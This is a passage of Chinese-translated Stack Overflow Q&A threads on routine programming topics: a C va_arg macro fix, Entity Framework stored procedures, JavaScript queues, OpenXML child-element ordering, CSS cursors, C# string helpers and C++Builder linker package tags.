                        zwMemcpy( &temp[ 0 ], &temp[ FIELD_BUFF_SIZE - counter ], counter );

                    temp[ counter++ ] = '.';                        

                    /* get mantissa part */
                    tempptr = &temp[ counter ];
                    do {
                        unum = ( mantissa * 10 ) / 1;
                        if( unum ){
                            *tempptr++ = (unsigned char)( unum ) + '0';     
                        }
                        else {
                            *tempptr++ = '0';   
                        }

                        mantissa = ( float ) ( mantissa * 10.0 - ( float )unum ) * 10.0;                        
                        counter++;
                    } while( mantissa > 0 || counter < minfield );

                    for( unum = 0; unum < counter; unum++ )
                        zwPutc( temp[ unum ] );

                    /* convert to decimal (backward) */
                    if( ft < 0 ) {      /* number is -'ve */
                        negative = 1;
                        ft = -ft;
                    }

                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( ft >= 1.0 ){
                            *tempptr-- = ( ft % 10.0 ) + '0';
//                          *tempptr-- = ( ft * 10 - ( ( ft * 100 ) / 10 ) ) + '0';
                        }
                        else {
                            if( negative && ( zeropad == 0 ) ) {
                                *tempptr-- = '-';
                                negative = 0;
                            }
                            else
                                *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        }
                        ft /= 10;
                        counter++;
                    } while( ft >= 1.0 || counter < minfield );

                    /* output the string */
                    if( negative )
                        zwPutc( '-' );

                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
#endif
                break;

                case 0:     /* end of string (malformed string anyway) */
                    va_end( args );
                    return -1;      /* error */
                break;
            }
        }
        else
            zwPutc( *format );

        format++;
    }

    va_end( args );

    return -1;
} 
```

请指导我，我应该怎么做才能纠正这个问题。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:16:08.270

您可以尝试替换：

```
#define va_arg( args, type ) *( (type *) args )++ 
```

和

```
#define va_arg( args, type ) *( (type *) args ), args += sizeof (type) 
```

解释：

您会收到编译错误，因为此表达式：

```
((type *) args )++ 
```

在 C 中无效：强制转换的结果不是左值，并且后缀`++`运算符要求其操作数是左值。许多编译器对这个约束很松懈，但显然你的不是（或者新版本更严格）。

另请注意，建议的解决方法应该在您的程序中使用简单的赋值表达式，例如：

```
unum = va_arg( args, unsigned int ); 
```

因为`=`比逗号运算符具有更高的优先级。

**编辑**：

另一个（也许更好）解决方案：您应该能够使用此解决方案绕过强制转换结果不是左值的事实：

```
#define va_arg( args, type ) *( *(type **) &args )++ 
```

# ios - 使用 UIWebView 将“不跟踪”添加到 iOS 浏览器应用程序

> ID：11786863
> 
> 赞同：0
> 
> 时间：2012-08-02T22:42:00.160
> 
> 标签：ios, uiwebview

您将如何为使用 UIWebView 的浏览器应用启用/支持“不跟踪”？这是 iOS 上的每个应用程序都必须自己包含的东西，还是已经在 UIWebView 中启用？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:52:48.157

Simple tools are coming like the one linked below -- add a line of JS at the top of the page and it turns off the tracking tags when the user has the DNT preference enabled. Should work on a mobile web view if you have a typical ad tag installation.

[http://www.ensighten.com/news/blog/ensighten-privacydnt-free-tool-managing-compliance-do-not-track](http://www.ensighten.com/news/blog/ensighten-privacydnt-free-tool-managing-compliance-do-not-track)

# entity-framework - 从存储过程返回匿名类型

> ID：11786865
> 
> 赞同：1
> 
> 时间：2012-08-02T22:42:21.233
> 
> 标签：entity-framework, entity-framework-4.1, sql-server-2008-r2

我有一个带有一组存储过程的现有数据库。我正在重新设计应用程序层而不更改数据库对象。我面临的困难之一是有许多存储过程彼此相似，因为它们查询相同的表但返回不同的列组合。

我既无法返回部分填充的实体，也无法找到使用 Entity Framework 4.1（和 SQL Server 2008 R2）从存储过程返回匿名类型的方法。这迫使我为每个存储过程定义太多复杂类型，尽管基础表结构是相同的。

我的问题是：

1.  请提出解决方案，以尽量减少可以使用 EF 实现且无需更改数据库对象的实体/复杂类型的数量。

2.  另外，是否可以返回部分填充的实体？这将使我能够重用实体。我不打算使用对象跟踪功能。

3.  我们如何从存储过程输出中返回匿名类型？这对我来说也足够好，因为在大多数情况下，我将以 JSON 格式将数据返回给客户端

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T05:00:48.167

您将无法返回匿名类型 - 这些通常仅限于它们在其中定义的方法的范围。

返回部分填充的类型本身是不可能的 - 但你可以这样做：

*   在您的数据库层中，调用有问题的存储过程；它将返回一个特定的复杂类型以匹配其“签名”
*   [使用AutoMapper](http://automapper.codeplex.com)之类的东西，您可以轻松地将复杂类型中的这些返回字段复制到系统的实体中，从而获得“部分填充”的实体
*   将该实体从您的数据库层返回到要使用的应用程序

您将无法避免仅仅为了从存储过程中获取返回值而拥有许多复杂类型 - 但您会将这些类型锁定在您的数据库层中，它们不会“泄漏”到您的整个应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-22T08:23:08.357

只需像过去一样使用**System.Data.DataTable 。**

# javascript - 异步函数队列

> ID：11786871
> 
> 赞同：1
> 
> 时间：2012-08-02T22:42:56.590
> 
> 标签：javascript, asynchronous

我如何创建函数队列。这是我需要做的一个例子。

```
db.connect(); // connecting

db.create({ hello: 'World'}).save(function (success) {
  // Connected ? if so execute this callback immediatly
  // otherwise Queue this whole operation and execute the callback.
});

db.get({ hello: 'World' }, function () {
  // Again connected ? execute immediatly
  // otherwise Queue this whole operation and execute later.
}); 
```

我遇到的问题不在于如何存储和执行回调，这很简单，问题是我如何记录操作？

我当然可以

```
 db.connect(function () {
   // connected ! do stuff..
 }) 
```

但它会导致回调地狱！

这是我的实现。

```
 function Database () {}

 Database.prototype.connect = function () {
   // connect here and emit connected.
   var self = this;
   connect(function () {
     self.connected = true;
     self.executeQueue();
   });
 };

Database.prototype.create = function (doc) {
  var self = this;
  // what should i do here ?

  // maybe ?
  if (self.connected) {
    self._save(doc);
  } else {
    self.addToQueue(function () {
     self._save(doc);
    });
  }
}; 
```

上述实现有效，但问题是`if`我必须在每个函数中执行的语句，这对我不利，原因有很多（单元测试等）。

有没有其他方法可以解决这个问题？

# javascript - 传递的变量不适用于我的函数 - Javascript

> ID：11786874
> 
> 赞同：0
> 
> 时间：2012-08-02T22:43:05.960
> 
> 标签：javascript, jquery

我在同一页面上有文本输入框和倒计时。我想从盒子里抽出时间，把它输入柜台。我从文本框“setTime”中得到了一个变量。我想将它直接放入我的 timeSplit 函数中（将时间转换为秒），但是当我这样做时，我得到一个错误“time.split 不是函数”。我在这里做错了什么？

当我有一个静态变量输入函数（例如时间=“12:12:12”）时，一切正常。- 除了没有使用正确的时间

当我在 timeSplit 函数之前在 setTime 上运行弹出警报时，我看到我的时间像这样“12:12:12”，所以它来自计数器没有问题，我没有收到 NaN 错误

为什么时间变量在静态时会起作用，而在传递时却不起作用

我尝试将 setTime 转换为字符串，但这只会导致 NaN 错误，即使我尝试将 sec 变量转换回 int 也是如此。

我认为这是相关代码，如果您需要更多，请告诉我。

```
var setTime = 0;
var $fromTime = $("#formEntry");

$("#setTime").off("click").on("click", function(){
  setTime = $fromTime.val();
});

function timeSplit(){
  //time = "12:12:12";
  tt = time.split(":");
  sec = tt[0]*3600+tt[1]*60+tt[2]*1;
  return sec;
}

var time = setTime;
//var time = "12:12:12";
var sec = timeSplit(time); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:46:40.087

您的函数`timeSplit()`不接受任何参数。它需要`timeSplit(time)`让 JavaScript 知道您正在谈论调用`.split()`对象上的方法，`time`而不是刚刚调用的函数`time.split()`。

如果这不仅仅是一个错字（我以前做过），我*建议*你阅读一些关于函数参数和参数的内容，这样你就知道你了解它是如何工作的，这真的很重要。

# java - 使用 java 库恢复一个特定版本中的所有更改

> ID：11786877
> 
> 赞同：1
> 
> 时间：2012-08-02T22:43:18.710
> 
> 标签：java, svn

我必须编写一个 java 代码，它将还原一个修订版的所有更改，然后提交它。它将等效于以下命令：

```
svn merge -r 50:49 A/trunk/

svn commit -m "reverting to rev49" 
```

你知道任何可以帮助我做到这一点的图书馆吗？（对不起，我的英语不是我的母语）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:36:37.167

尝试查看 svnkit。它有一个很好的工作副本 api。

# java - lobo 项目从 ColorFactory.java 类中提取命名颜色？

> ID：11786880
> 
> 赞同：-1
> 
> 时间：2012-08-02T22:43:36.557
> 
> 标签：java, swing

在新课程中我需要什么类型的过程来“阅读”下面这个课程中的所有颜色？我使用该类为组件设置颜色并喜欢它。但是现在是时候让我的应用程序右键单击面板并更改背景颜色了。

在继续使用这些颜色时，是什么让我在正确的方向上开始编码：[`ColorFactory.java`](http://www.java2s.com/Code/Java/2D-Graphics-GUI/ColorFactory.htm)

我刚刚开始考虑向类添加一个新方法，例如：

```
public Map<String, Color> getColorMapValues(){

    return colorMap;
    //
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:01:02.880

您可以通过反射访问颜色图。我不保证以下代码，因为我手头没有 IDE，但这应该可以解决问题：

```
private static Map<String, Color> getColorMap() throws Exception {
    Field colorMapField = ColorFactory.class.getDeclaredField("colorMap");
    colorMapField.setAccessible(true);
    return (Map<String, Color>) colorMapField.get(ColorFactory.getInstance());
} 
```

然后您可以查询返回的颜色图以按名称获取颜色：

```
Map<String, Color> colorMap = getColorMap();
Color yellow = colorMap.get("yellow"); 
```

如果你想修改颜色图，只需用上面的方法检索它，put()“任何你喜欢的颜色”（是的，Pink Floyd 参考！），然后调用这个方法：

```
public void setColorMap(Map<String, Color> colorMap) throws Exception {
    Field colorMapField = ColorFactory.class.getDeclaredField("colorMap");
    colorMapField.setAccessible(true);
    colorMapField.set(ColorFactory.getInstance(), colorMap);
} 
```

请注意，这对于类的同步策略是非常危险的，但如果您不使用多个线程发送垃圾邮件，它应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T16:04:59.323

由于在这种情况下您可以控制源代码，因此最好重构类以满足您的需求而不是使用反射（这不仅昂贵，而且根据您的安全策略被禁止）。

常用的技术是`Holder pattern`. 有关更多信息，请参阅 Joshua Bloch 的 Effective Java（第 2 版）第 71 条。我们还可以通过使用线程安全的非阻塞结构来避免读取同步，即`java.util.concurrent.ConcurrentHashMap`.

```
public class ColorFactory {
    private static class ColorFactoryHolder {
        // creates on instantiation of ColorFactoryHolder
        // synchronization is baked into the JVM, but won't be created until
        // the class is used, see JLS 12.4.1
        static final ColorFactory instance = new ColorMap();
    }
    public static ColorFactory getInstance() { return ColorFactoryHolder.instance; }
    // concurrent hash map - all operations are thread safe
    Map<String,Color> colormap = new ConcurrentHashMap<String,Color>();
    private final Object lock = new Object();
    private ColorFactory() {
        colormap.add("blue",new Color(0,0,255));
        // rest of colors here
    }
    public Color getColor(String spec) {
        if(colormap.containsKey(spec)) return colormap.get(spec);
        // don't synchronize externally - Bloch et al, item 70
        synchronized(lock) { 
            // double check idiom - not broken, as map is thread safe
            if(colormap.containsKey(spec)) return colormap.get(spec);
            Color color = parse(spec); // parse method can be extracted from old code
            colormap.put(spec,color);
            return color;
        }
    }
    private static Color parse(String spec) {
        // parse the color spec here
    }    
} 
```

事实上，因为解析操作可能非常非常快（与同步相比），我们可以完全取消同步。所以我们最终可能会多次解析这个值——这并不是一个大问题，因为每次结果都是一样的。见布洛赫等人。项目 69 了解更多信息。

```
public class ColorFactory {
    private static class ColorFactoryHolder {
        // same as above, snipped for brevity
    }
    public static ColorFactory getInstance() { return ColorFactoryHolder.instance; }
    // requires ConcurrentMap reference to get putIfAbsent(K,V) method
    ConcurrentMap<String,Color> colormap = new ConcurrentHashMap<String,Color>();
    // private final Object lock = new Object(); - removed
    private ColorFactory() {
        colormap.add("blue",new Color(0,0,255));
        // rest of colors here
    }
    public Color getColor(String spec) {
        Color result = colormap.get(spec);
        if(result == null) {         
            result = parse(spec); // may parse multiple times, but still
                                  // cheaper than synchronization
            colormap.putIfAbsent(spec,result);            
        }
        return result
    }
    private static Color parse(String spec) {
        // parse the color spec here
    }    
} 
```

# c# - 在从 ThreadPool 开始的任务中发出“等待”是否有任何价值

> ID：11786885
> 
> 赞同：0
> 
> 时间：2012-08-02T22:44:09.780
> 
> 标签：c#, .net, asynchronous, tap, ctp

很明显，使用“等待”从 UI 线程卸载任务是一件好事 - UI 线程可以返回处理 Windows 消息。

但是，假设您使用 Task.Run 启动等待的任务，它会在 ThreadPool 的线程上启动您的代码。在该代码中执行“等待”是否有任何价值（从技术上讲它甚至可以完成？）？

我很想说“不”。为什么要从 ThreadPool 线程中卸载工作——除了处理分配给它的原始任务之外，它还需要做什么？

现在，如果有人回复说如果我执行 await，ThreadPool 线程实际上可以“释放”到池中并在其他地方使用，而我的异步工作仍在继续……

迈克尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:59:59.683

> 从技术上讲，它甚至可以做到吗？

是的。产生的延续将在（可能）不同的 ThreadPool 线程上运行，因为没有 current `SynchronizationContext`。但是，该机制运作良好。

> 在该代码中执行“等待”有什么价值吗？

就在这里。见下文。

> 为什么要从 ThreadPool 线程中卸载工作——除了处理分配给它的原始任务之外，它还需要做什么？

您可以释放线程来做其他工作。ThreadPool 线程是有限的、有限的资源。

> 现在，如果有人回复说如果我执行等待，ThreadPool 线程实际上可以“释放”到池中并在其他地方使用，而我的异步工作仍在继续，我会印象深刻。

是的，这实际上就是发生的事情。

除了释放任务的能力之外，这样做还有一个巨大的优势 - 您可以使用相同的方法，使用相同的代码，无论您是在 ThreadPool 还是具有同步上下文的线程上。重用相同代码的能力也非常有价值。

# c# - OpenXml：工作表子元素的排序更改导致文件损坏

> ID：11786891
> 
> 赞同：8
> 
> 时间：2012-08-02T22:44:41.030
> 
> 标签：c#, openxml, openxml-sdk

我正在尝试使用 openxml 来生成自动化的 excel 文件。我面临的一个问题是使用开放的 xml 对象模型来适应我的对象模型。我必须意识到我为工作表附加子元素的顺序很重要。

例如：

```
workSheet.Append(sheetViews);
workSheet.Append(columns);
workSheet.Append(sheetData);
workSheet.Append(mergeCells);
workSheet.Append(drawing); 
```

上述排序没有给出任何错误。

但以下内容：

```
workSheet.Append(sheetViews);
workSheet.Append(columns);
workSheet.Append(sheetData);
workSheet.Append(drawing);
workSheet.Append(mergeCells); 
```

给出错误

因此，这不允许我随时创建绘图对象并将其附加到工作表中。这迫使我在使用它们之前创建这些元素。

谁能告诉我我是否正确理解了这个问题？因为我相信我们应该能够打开任何 excel 文件，如有必要，可以为工作表创建一个新的子元素并附加它。但是现在这可能会破坏这些元素应该被附加的顺序。

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T19:32:20.703

根据[标准 ECMA-376 Office Open XML File Formats](http://www.ecma-international.org/publications/standards/Ecma-376.htm)，`CT_Worksheet`具有所需的序列：

![CT_Worksheet 架构图](../Images/01cab0f256b4e5aadd2284041ebe7f18.png)

以下是崩溃的原因：

```
workSheet.Append(sheetViews);
workSheet.Append(columns);
workSheet.Append(sheetData);
workSheet.Append(drawing);
workSheet.Append(mergeCells); 
```

是因为你有`drawing` **过** `mergeCells`。只要您附加您的`mergeCells` *after* `drawing`，您的代码应该可以正常工作。

注意：您可以在[ECMA-376 第 3 版第 1 部分 (.zip)](http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-376,%20Third%20Edition,%20Part%201%20-%20Fundamentals%20And%20Markup%20Language%20Reference.zip) -> OfficeOpenXML-XMLSchema-Strict -> sml.xsd 中找到完整的 XSD。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-18T18:44:42.027

我发现对于父对象定义了属性的所有“单例”子对象（例如 Worksheet.sheetViews），使用单例属性并将新对象分配给该对象而不是使用“追加”这会导致类本身确保顺序是正确的。

```
workSheet.Append(sheetViews);
workSheet.Append(columns);
workSheet.Append(sheetData);  // bad idea(though it does work if the order is good)
workSheet.Append(drawing);
workSheet.Append(mergeCells); 
```

更正确的格式...

```
workSheet.sheetViews=sheetViews; // order doesn't matter.
workSheet.columns=columns;
... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-04T06:06:39.693

正如 Joe Masilotti[已经解释](https://stackoverflow.com/a/12221477/2383264)的那样，顺序是在模式中定义的。

不幸的是，OpenXML 库不能确保序列化 XML 中子元素的正确顺序，正如底层 XML 模式所要求的那样。如果顺序不正确，应用程序可能无法成功解析 XML。

这是我在代码中使用的通用解决方案：

```
private T GetOrCreateWorksheetChildCollection<T>(Spreadsheet.Worksheet worksheet) 
    where T : OpenXmlCompositeElement, new()
{
    T collection = worksheet.GetFirstChild<T>();
    if (collection == null)
    {
        collection = new T();
        if (!worksheet.HasChildren)
        {
            worksheet.AppendChild(collection);
        }
        else
        {
            // compute the positions of all child elements (existing + new collection)
            List<int> schemaPositions = worksheet.ChildElements
                .Select(e => _childElementNames.IndexOf(e.LocalName)).ToList();
            int collectionSchemaPos = _childElementNames.IndexOf(collection.LocalName);
            schemaPositions.Add(collectionSchemaPos);
            schemaPositions = schemaPositions.OrderBy(i => i).ToList();

            // now get the index where the position of the new child is
            int index = schemaPositions.IndexOf(collectionSchemaPos);

            // this is the index to insert the new element
            worksheet.InsertAt(collection, index);
        }
    }
    return collection;
}

// names and order of possible child elements according to the openXML schema
private static readonly List<string> _childElementNames = new List<string>() { 
    "sheetPr", "dimension", "sheetViews", "sheetFormatPr", "cols", "sheetData", 
    "sheetCalcPr", "sheetProtection", "protectedRanges", "scenarios", "autoFilter",
    "sortState", "dataConsolidate", "customSheetViews", "mergeCells", "phoneticPr",
    "conditionalFormatting", "dataValidations", "hyperlinks", "printOptions", 
    "pageMargins", "pageSetup", "headerFooter", "rowBreaks", "colBreaks", 
    "customProperties", "cellWatches", "ignoredErrors", "smartTags", "drawing",
    "drawingHF", "picture", "oleObjects", "controls", "webPublishItems", "tableParts",
    "extLst"
}; 
```

该方法总是在正确的位置插入新的子元素，确保生成的文档是有效的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-08-02T20:42:55.777

对于那些像我一样通过谷歌最终到达这里的人，下面的函数解决了插入子元素后的排序问题：

```
public static T ReorderChildren<T>(T element) where T : OpenXmlElement
{
  Dictionary<Type, int> childOrderHashTable = element.GetType()
                                                  .GetCustomAttributes()
                                                  .Where(x => x is ChildElementInfoAttribute)
                                                  .Select( (x, idx) => new KeyValuePair<Type, int>(((ChildElementInfoAttribute)x).ElementType, idx))
                                                  .ToDictionary(x => x.Key, x => x.Value);

  List<OpenXmlElement> reorderedChildren = element.ChildElements
                                                .OrderBy(x => childOrderHashTable[x.GetType()])
                                                .ToList();
  element.RemoveAllChildren();
  element.Append(reorderedChildren);
  return element;         
} 
```

库中生成的类型`DocumentFormat.OpenXml`具有自定义属性，可用于反映 OOXML 模式中的元数据。此解决方案依赖于`System.Reflection`and `System.Linq`（即，不是很快），但无需硬编码字符串列表以正确排序特定类型的子元素。

我在对属性进行验证后使用此函数，`ValidationErrorInfo.Node`并通过引用清理新创建的元素。这样我就没有在整个文档中递归地应用这个方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-06-11T03:33:59.727

helb 的回答很漂亮 - 谢谢你，helb。

它有一个小缺点，它不测试子元素的顺序是否已经存在问题。以下轻微修改确保添加新元素时没有预先存在的问题（您仍然需要 his `_childElementNames`，这是无价的）并且效率更高：

```
 private static int getChildElementOrderIndex(OpenXmlElement collection)
    {
        int orderIndex = _childElementNames.IndexOf(collection.LocalName);
        if( orderIndex < 0)
            throw new InvalidOperationException($"Internal: worksheet part {collection.LocalName} not found");
        return orderIndex;
    }
    private static T GetOrCreateWorksheetChildCollection<T>(Worksheet worksheet) where T : OpenXmlCompositeElement, new()
    {
        T collection = worksheet.GetFirstChild<T>();
        if (collection == null)
        {
            collection = new T();
            if (!worksheet.HasChildren)
            {
                worksheet.AppendChild(collection);
            }
            else
            {
                int collectionSchemaPos = getChildElementOrderIndex(collection);
                int insertPos = 0;
                int lastOrderNum = -1;
                for(int i=0; i<worksheet.ChildElements.Count; ++i)
                {
                    int thisOrderNum = getChildElementOrderIndex(worksheet.ChildElements[i]);
                    if(thisOrderNum<=lastOrderNum)
                        throw new InvalidOperationException($"Internal: worksheet parts {_childElementNames[lastOrderNum]} and {_childElementNames[thisOrderNum]} out of order");
                    lastOrderNum = thisOrderNum;
                    if( thisOrderNum < collectionSchemaPos )
                        ++insertPos;
                }
                // this is the index to insert the new element
                worksheet.InsertAt(collection, insertPos);
            }
        }
        return collection;
    } 
```

# javascript - 按属性更改光标

> ID：11786897
> 
> 赞同：0
> 
> 时间：2012-08-02T22:45:10.920
> 
> 标签：javascript, jquery, html, css

我有点陷入以下困境。在我的网站中，我有一个下拉菜单。导致下拉菜单折叠的主要项目不可点击。但是，我想将该项目的光标更改为正常，但要确保下拉菜单仍然有“手”光标。

html将是：

```
<ul> 
  <li>
    <a href="nice.php">Normal item<a/>
  </li> 
  <li>
    <a href="#">Dropdown initator</a> 
    <ul>
      <li><a href="droppage.php>Dropdown item</a></li>
    </ul> 
  </li> 
 </ul> 
```

所以 href="#" 的链接应该有非链接光标；其他人应该有光标：'指针'。

尝试过 JS 但它不起作用，它使下拉项的光标也是错误的：

```
$('ul li').hover(function() {
   if($(this).find("a").attr("href") === "#"){
      $(this).css('cursor','e-resize');
      $(this).find("a").css('cursor', 'e-resize');
      $(this).find("ul li").css('cursor', 'pointer');
    }
}); 
```

它不应该有任何区别，但该页面实际上是 wordpress 安装的一部分。

很感谢任何形式的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:49:23.363

只需使用 CSS。

```
a[href='#']{
    cursor: e-resize;   
} 
```

演示：http: [//jsfiddle.net/XnNUt/](http://jsfiddle.net/XnNUt/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:50:40.033

您可以添加以下CSS：

```
a {
   cursor: pointer;
}

a[href="#"] {
   cursor: default;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:47:53.327

`cursor: pointer;`为该特定类设置 css 属性。

# c# - c#字符串技巧/功能？

> ID：11786898
> 
> 赞同：-5
> 
> 时间：2012-08-02T22:45:14.790
> 
> 标签：c#, string

我一直讨厌字符串解析，这是我在当前项目中经常做的事情。

c# 是否具有字符串的技巧或快速功能，可以让我的生活更轻松？特别是裁剪、乘法或子串？这里的最终目标是获取一个字符串列表并将其变成一个漂亮的柱状结构。很容易，但我仍然希望它是 python 容易。

例如，python 有：

```
>>> a = "I once was a string, then I got mutilated"
>>> print a[20:]
then I got mutilated 
```

或者

```
>>> 'chicken' in 'chicken noodle soup'
True 
```

或者最后

```
>>> 'lol' * 5
'lollollollollol' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:49:05.400

C# 中没有与 Python 中的语言相关的功能。唯一真正具有字符串的 C# 语言功能是允许将 + 映射到[String.Concat](http://msdn.microsoft.com/en-us/library/system.string.concat)，以简化（并保持高效）`"a" + "b" + "c"`语句。

但是，[String 类](http://msdn.microsoft.com/en-us/library/system.string.aspx)通过方法提供此功能。还有[StringBuilder](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder.aspx)，用于构建基于多个连接的大字符串。

在您的示例中，请参阅String.Substring[切片](http://msdn.microsoft.com/en-us/library/system.string.substring.aspx)和[String.Contains](http://msdn.microsoft.com/en-us/library/dy85x1sa.aspx)。`in`没有像 Python 中的乘法那样简单的“重复”式操作。

话虽如此[，制作一个处理乘法功能的扩展方法很容易](https://stackoverflow.com/a/532912/65358)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-03T01:34:18.963

**第一个问题**

您可以使用`String.SubString()`：

```
string a = "I once was a string, then I got mutilated";
string lastTwentyCharactersOfA = a.Substring(Math.Max(0, a.Length - 20));
// returns "then I got mutilated" 
```

应得的信用： 如果您的字符串的字符数少于您请求的字符数，[此答案](https://stackoverflow.com/questions/6413572/how-to-get-last-4-character-from-a-string-in-c)可以很好地确保您不会遇到异常。

**第二个问题**

您可以使用`String.Contains()`：

```
string soup = "chicken noodle soup";
bool soupContainsChicken = soup.Contains("chicken");  // returns True 
```

**第三个问题**

您不能覆盖`String`该类的乘法运算符。这是一个密封的类，当然您无权访问源代码以使其成为`partial`类或类似的东西。你有几个选项可以让你接近你想做的事情。一种是写一个扩展方法：

```
public static string MultiplyBy(this string s, int times)
{
    StringBuilder sb = new StringBuilder();

    for (int i = 0; i < times; i++)
    {
        sb.Append(s);
    }

    return sb.ToString();
} 
```

用法：

```
string lol = "lol";
string trololol = lol.MultiplyBy(5);  // returns "lollollollollol" 
```

或者，如果您想走运算符重载的路线，您可以编写一个自定义`String`类，然后使用它。

```
public struct BetterString  // probably not better than System.String at all
{
    public string Value { get; set; }

    public static BetterString operator *(BetterString s, int times)
    {
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < times; i++)
        {
            sb.Append(s.Value);
        }

        return new BetterString { Value = sb.ToString() };
    }
} 
```

用法：

```
BetterString lol = new BetterString { Value = "lol" };
BetterString trololol = lol * 5;  // trololol.Value is "lollollollollol" 
```

一般来说，你可以用`System.String`和做很多事情`System.Text.StringBuilder`。扩展方法的可能性几乎是无穷无尽的。如果您有兴趣了解这一切的来龙去脉，请查看 MSDN。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:52:05.827

它们是不同的语言——语法不同，以这种方式将 C# 与 Python 进行比较在很大程度上是没有意义的。另外，我完全挑战您的断言，即您给出的示例“更容易”。

我不明白你怎么能比：

```
Console.WriteLine("Foo".Substring(1)); //<-- prints 'oo'
Console.WriteLine("chicken noodle soup".Contains("chicken")
                  .ToString()); //<-- prints 'true' 
```

对于最后一个，请阅读以下内容：[我可以“乘”一个字符串（在 C# 中）吗？](https://stackoverflow.com/questions/532892/can-i-multiply-a-string-in-c)

就个人而言，特别是，我讨厌乘以一个字符串的想法——如果这个值恰好是太多的歧义`'5'`——将这些功能隐藏在操作符的气味后面。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T22:51:41.543

使用 linq，您可以将您的字符串视为一个字符列表，并轻松地做您想做的事情。

```
var chickenString = "chicken noodle soup";
var hasChicken = chickenString.Contains("chicken"); 
// hasChicken = true at this point... 
```

# linker - 了解 .cbproj 文件中的包导入

> ID：11786900
> 
> 赞同：12
> 
> 时间：2012-08-02T22:46:07.193
> 
> 标签：linker, c++builder, c++builder-2010, runtime-packages

我正在使用 Embarcadero RAD Studio 2010 (C++)。项目文件 (.cbproj) 有五个不同的标签，其中包含 .bpis 或 .libs 的列表。我想要一些关于链接器如何使用这些库文件列表的信息（在使用或不使用运行时包进行构建时）。

**LinkPackageImports**

**LinkPackageStatics**

**所有包库**

**包库**

**PackageImports**
我想我已经理解了最后一个。它包含可以从 IDE 中的项目属性设置的运行时包列表。

这个问题的动机是我试图从我的应用程序中消除不必要的依赖关系。.cbproj 中的这五个标签似乎都包含任意种类的不同库和 bpi。一些我知道我不需要的库，还有一些我认为我不需要的库。从某些列表中删除某些库似乎没有效果，而从其他列表中删除其他库会导致表单的链接器错误`[ILINK32 Error] Fatal: Unable to open file 'FILENAME.OBJ'`

我正在慢慢解决所有链接器问题，但是当我在这五个列表之一中包含库名称时，确切地知道我告诉链接器做什么会很有帮助。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-14T19:27:08.870

我确信这些信息一定存在于某处，但我无法在任何论坛或文档中找到它。我已经从我自己的实验中推断出所有这些，但我希望从更官方的来源获得反馈。

**PackageImports** -- 这在 IDE 的项目选项中显示为“运行时包”列表。如果您在 IDE 的“运行时包”列表中添加或删除任何内容，此标记将更新以反映这一点。如果 cbproj 文件中此标记为空或缺失，它将自动填充与安装在 RAD Studio 中的所有设计时包关联的所有运行时包的列表。从命令行构建时，此标记无效。IDE 似乎使用 PackageImports 标记来计算它实际要链接的库。

将库放在此列表中不会（本身）创建任何新的依赖项；您实际上是在告诉 IDE“如果您必须链接这些库中的任何一个，请动态链接它们而不是静态链接”。

**AllPackageLibs** -- 这是 IDE 的列表，列出了它认为项目成功链接所需的所有库。从命令行构建时，此标记无效。如果您对项目进行更改（例如添加文件），IDE 将尝试重新计算 AllPackageLibs 的内容。`#pragma link`它根据在项目文件中找到的 s 计算此值。（我通过注释掉`#pragma link`项目中的所有 s 并注意到在我进行项目修改时没有重新填充 AllPackageLibs 来确定这一点。）

**LinkPackageStatics——**如果 IDE 在 AllPackageLibs 中找到一个*未*出现在 PackageImports 中的库，它会决定静态链接该库。在这种情况下，IDE 会自动将库名称复制到 LinkPackageStatics。如果从 IDE 构建，此标记将始终从 AllPackageLibs 和 PackageImports 重新计算，因此您在此处手动添加的任何内容都将被链接器忽略。但是，如果从命令行构建，此标记中的所有文件（.libs 或 .bpis）将被链接并出现在 ilink32 命令行的“objfiles”部分中。

**LinkPackageImports——**如果 IDE 在 AllPackageLibs 中找到一个*确实*出现在 PackageImports 中的库，它决定动态链接该库。在这种情况下，IDE 会将库名称（扩展名为 .bpi）复制到 LinkPackageImports。如果从 IDE 构建，此标记将始终从 AllPackageLibs 和 PackageImports 重新计算，因此您在此处手动添加的任何内容都将被链接器忽略。但是，如果从命令行构建，则此标记中的所有文件（.libs 或 .bpis）都将被链接并出现在 ilink32 命令行的“libfiles”部分中。

**PackageLibs** -- PackageLibs 中的任何内容（.libs 或 .bpis）都将由 IDE 直接添加到 LinkPackageStatics（无论 PackageImports 包含什么）。这些库被添加到来自 AllPackageLibs 的库前面的 LinkPackageStatics。命令行构建不受此标记的影响。

